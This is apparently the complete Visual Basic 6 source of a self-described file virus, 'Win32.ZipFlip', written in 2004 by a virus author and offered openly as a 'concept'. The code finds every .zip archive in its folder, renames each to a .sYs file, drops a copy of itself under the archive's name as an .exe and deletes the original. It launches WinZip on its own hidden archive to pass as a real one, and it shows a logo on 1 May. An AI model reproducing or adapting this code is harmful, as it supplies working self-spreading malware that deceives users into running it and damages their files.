   VERSION 5.00
   Begin VB.Form frmZipFlip
      BorderStyle     =   0  'Kein
      Caption         =   "Win32.ZipFlip - by DiA (c)04"
      ClientHeight    =   4485
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   4500
      Icon            =   "frmZipFlip.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      ScaleHeight     =   4485
      ScaleWidth      =   4500
      ShowInTaskbar   =   0   'False
      StartUpPosition =   2  'Bildschirmmitte
      Visible         =   0   'False
      Begin VB.Image Image1
         Height          =   4500
         Left            =   0
         Picture         =   "frmZipFlip.frx":030A
         Top             =   0
         Width           =   4500
      End
   End
   Attribute VB_Name = "frmZipFlip"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   'ZipFlip Version 1.0
   'by DiA (c)04 GermanY
   'www.vx-dia.de.vu
   'DiA_hates_machine@gmx.de
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

   'I code this creature only as a concept! I have written this in school
   'to kill the time, i want to write it in Win32Asm, but no TASM5 in school.
   'maybe it comming soon in asm, don't know.
   'I don't describe what this bastard do, come on! It's lame VB6 source, look by yourself...
   'have fun with this....
   '
   '
   'DiA - now in school =))
   ''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



   'FindFirstFileA, FindNextFileA, FindClose
   Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long
   Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
   Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long

   'Win32FindData
   Private Type FILETIME
     dwLowDateTime As Long
     dwHighDateTime As Long
   End Type

   Private Type WIN32_FIND_DATA
     dwFileAttributes As Long
     ftCreationTime As FILETIME
     ftLastAccessTime As FILETIME
     ftLastWriteTime As FILETIME
     nFileSizeHigh As Long
     nFileSizeLow As Long
     dwReserved0 As Long
     dwReserved1 As Long
     cFileName As String * 260
     cAlternate As String * 14
   End Type

   Dim Found As WIN32_FIND_DATA, Retval As Long, hFile As Long

   Dim EXE_Path As String
   Dim EXE_Name As String
   Dim ZIP_Name As String

   Dim WS As Object
   Dim RegPath As String
   Dim WinZipPath As String

   Dim TargetFile As String
   Dim FSO As Object
   Dim PointPos As Integer
   Dim HostFile As String
   Dim TargetFileEXE As String



   Function RegRead(RegPath As String) As String
       On Error GoTo ErrorHandler

       Set WS = CreateObject("WScript.Shell")
       RegRead = WS.RegRead(RegPath)
       Exit Function

   ErrorHandler:
       RegRead = "No" 'can't read winzip path
   End Function


   Private Sub Form_Load()

       'get name of virus and pseudo zip (.sYs)
       If Right(App.Path, 1) <> "\" Then
           EXE_Path = App.Path & "\"
           EXE_Name = Path & App.EXEName & ".exe"
           ZIP_Name = Path & App.EXEName & ".sYs"
       Else
           EXE_Path = App.Path
           EXE_Name = Path & App.EXEName & ".exe"
           ZIP_Name = Path & App.EXEName & ".sYs"
       End If


       'get WinZip Path and application
       WinZipPath = RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\WinZip\InstallLocation") & "WinZip32.exe"
       'no WinZip Path found
       If WinZipPath = "NoWinZip32.exe" Then
           MsgBox "No WinZip32.exe! Please check your WinZip installation.", vbCritical, "Can't open Archive"
           GoTo Payload
       End If


       'run host ZIP Archine
       Shell WinZipPath & " " & ZIP_Name, vbNormalFocus


       'find all .ZIP archives in current directory and infect them
       hFile = FindFirstFile(EXE_Path & "*.zip", Found) 'FindFirstFileA

       If hFile = -1 Then GoTo Payload 'no files

       Do
           Select Case CBool(Found.dwFileAttributes And vbDirectory)
               Case False 'it's a file

                   TargetFile = EXE_Path & Left$(Found.cFileName, InStr(1, Found.cFileName, vbNullChar) - 1)

                   PointPos = InStr(TargetFile, ".")
                   HostFile = Left(TargetFile, PointPos) & "sYs" 'filename.sys

                   Set FSO = CreateObject("Scripting.FileSystemObject") 'easy way to check if file already exist

                   If FSO.FileExists(HostFile) = False Then 'don't infect if renamed hostname already exists

                   PointPos = InStr(TargetFile, ".")
                   TargetFileEXE = Left(TargetFile, PointPos) & "exe" 'filename.exe

                       FileCopy TargetFile, HostFile
                       FileCopy EXE_Name, TargetFileEXE

                       Kill TargetFile 'delete old .zip file
                   End If

           End Select

       Retval = FindNextFile(hFile, Found) 'FindNextFileA

       DoEvents
       Loop Until Retval = 0 'no more files
       FindClose hFile 'FindClose

   Payload:
       If Format$(Now, "dd.mm") = "01.05" Then  'Payload, only show window with ZipFlip Logo
           frmZipFlip.Visible = True

       Else
           End 'exit virus

       End If

   End Sub

   Private Sub Image1_Click()
   End 'end window
   End Sub
